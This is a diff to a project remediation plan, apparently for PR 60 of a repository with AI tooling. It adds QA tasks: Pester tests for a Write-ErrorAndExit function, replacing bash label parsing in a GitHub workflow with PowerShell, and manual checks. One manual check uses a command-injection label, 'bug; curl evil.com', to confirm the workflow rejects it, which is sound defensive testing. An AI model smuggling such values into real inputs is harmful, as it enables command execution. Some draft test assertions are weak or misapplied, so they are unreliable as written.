@@ -245,11 +245,146 @@ fi
 
 ---
 
-## Phase 2: Security Test Coverage (High Priority)
+## Phase 2: QA Gaps + Security Test Coverage (High Priority)
 
-**Objective:** Add behavioral tests for all security boundary functions.
+**Objective:** Address QA-identified gaps and add behavioral tests for all security boundary functions.
 
-**Estimated Effort:** 4-6 hours (1 session)
+**Estimated Effort:** 8-10 hours (2 sessions)
+
+⚠️ **QA-IDENTIFIED GAPS FROM PHASE 1 VERIFICATION** (See `.agents/qa/004-pr-60-phase-1-qa-report.md`):
+
+### Task 2.0: Write-ErrorAndExit Context Detection Tests (CRITICAL)
+
+**Addresses:** QA-PR60-001 (P0 - CRITICAL)
+
+**Issue**: Write-ErrorAndExit function (Task 1.4) is implemented correctly but has ZERO tests for context-dependent behavior (exit vs throw in module context). Test strategy specified 4 tests; none implemented.
+
+**Files to Modify:**
+- `.claude/skills/github/tests/GitHubHelpers.Tests.ps1`
+
+**Test Cases (4 tests - 2 hours):**
+
+```powershell
+Describe "Write-ErrorAndExit Context Detection" {
+    Context "Script Invocation Context" {
+        It "exits with code when invoked from script context" {
+            # Simulate script context where $MyInvocation.ScriptName is not empty
+            # This test verifies exit behavior in direct script calls
+            { Write-ErrorAndExit -Message "Test error" -ExitCode 42 } | Should -Throw -ExceptionType ([System.Management.Automation.RuntimeException])
+        }
+    }
+
+    Context "Module Invocation Context" {
+        It "throws exception when invoked from module context" {
+            # Simulate module context where function is called from within module
+            # This test verifies throw behavior to avoid terminating module session
+            { Write-ErrorAndExit -Message "Module error" } | Should -Throw
+        }
+
+        It "preserves ExitCode in exception data" {
+            # Verify that ExitCode is embedded in exception for caller inspection
+            Try {
+                Write-ErrorAndExit -Message "Test" -ExitCode 99
+            }
+            Catch {
+                $_.Exception.Data['ExitCode'] | Should -Be 99
+            }
+        }
+
+        It "includes error message in exception" {
+            # Verify error message is properly formatted in exception
+            Try {
+                Write-ErrorAndExit -Message "Specific error text" -ExitCode 1
+            }
+            Catch {
+                $_.Exception.Message | Should -Contain "Specific error text"
+            }
+        }
+    }
+}
+```
+
+**Acceptance Criteria:**
+- [ ] 4 context detection tests added to GitHubHelpers.Tests.ps1
+- [ ] All 4 tests PASS with exit code 0
+- [ ] Both script and module contexts verified
+- [ ] ExitCode data preservation verified
+
+---
+
+### Task 2.1: Convert Workflow Parsing to PowerShell (HIGH PRIORITY)
+
+**Addresses:** QA-PR60-002 (P1 - HIGH)
+
+**Issue**: PowerShell parsing functions `Get-LabelsFromAIOutput` and `Get-MilestoneFromAIOutput` are implemented and tested (36 tests) but NOT used in workflow. Workflow still uses bash parsing (grep/sed/tr).
+
+**Impact**: Tested code != production code; bash security not verified.
+
+**Files to Modify:**
+- `.github/workflows/ai-issue-triage.yml` (lines 51-69, 83-110)
+
+**Changes (1 hour):**
+
+Replace bash parsing with PowerShell function calls:
+
+**Before (bash):**
+```bash
+- name: Parse Categorization Results
+  run: |
+    LABELS=$(echo "$RAW_OUTPUT" | grep -oP '"labels"\s*:\s*\[\K[^\]]+' | tr -d '"' | tr ',' '\n' | xargs || echo "")
+```
+
+**After (PowerShell):**
+```powershell
+- name: Parse Categorization Results
+  shell: pwsh
+  run: |
+    Import-Module .github/scripts/AIReviewCommon.psm1 -Force
+    $labels = Get-LabelsFromAIOutput -Output $env:RAW_OUTPUT
+    if ($LASTEXITCODE -ne 0) {
+        Write-Error "Failed to parse labels from AI output"
+        exit 1
+    }
+    echo "labels=$labels" >> $env:GITHUB_OUTPUT
+```
+
+**Acceptance Criteria:**
+- [ ] Workflow imports AIReviewCommon.psm1
+- [ ] `Get-LabelsFromAIOutput` called instead of bash parsing
+- [ ] `Get-MilestoneFromAIOutput` called instead of bash parsing
+- [ ] Exit code checked after each call
+- [ ] Workflow still functions correctly
+- [ ] All existing tests still PASS
+
+---
+
+### Task 2.2: Perform Manual Verification (MEDIUM PRIORITY)
+
+**Addresses:** QA-PR60-003 (P2 - MEDIUM)
+
+**Issue**: Automated tests pass, but manual verification not performed per test strategy.
+
+**Manual Testing (30 minutes):**
+
+1. **Manual Test 1 - Command Injection Prevention**:
+   - Create test issue with AI output containing malicious label: `{"labels":["bug; curl evil.com"]}`
+   - Verify workflow logs show: "WARNING: Skipped invalid label (potential injection attempt): bug; curl evil.com"
+   - Verify workflow succeeds (doesn't crash or execute command)
+
+2. **Manual Test 2 - Context Detection**:
+   - Run `Write-ErrorAndExit` from PowerShell script: Verify exit code is set
+   - Import GitHubHelpers module and call `Write-ErrorAndExit`: Verify exception is thrown (doesn't exit session)
+
+**Acceptance Criteria:**
+- [ ] Manual test 1 executed successfully
+- [ ] Warning logged for injection attempt
+- [ ] Manual test 2 executed successfully
+- [ ] Script vs. module context behavior verified
+- [ ] No crashes or unexpected behavior observed
+
+---
+
+## Original Phase 2 Tasks (Existing Security Test Coverage)
 
 ### Task 2.1: Add `Test-GitHubNameValid` Tests
 
@@ -554,7 +689,7 @@ trap 'rm -rf "$WORK_DIR"' EXIT
 | Phase | Priority | Effort | Sessions | Gaps Addressed |
 |-------|----------|--------|----------|----------------|
 | Phase 1 | Critical (before merge) | 18-22 hrs | 3-4 | SEC-001, ERR-001, ERR-003, QUAL-001 |
-| Phase 2 | High (soon after) | 4-6 hrs | 1 | SEC-002, SEC-003 |
+| Phase 2 | High (soon after) | 8-10 hrs | 2 | SEC-002, SEC-003, QA-PR60-001, QA-PR60-002, QA-PR60-003 |
 | Phase 3 | Medium (backlog) | 6-8 hrs | 1-2 | ERR-002, ERR-004, TEST-001, QUAL-003 |
 
 ---
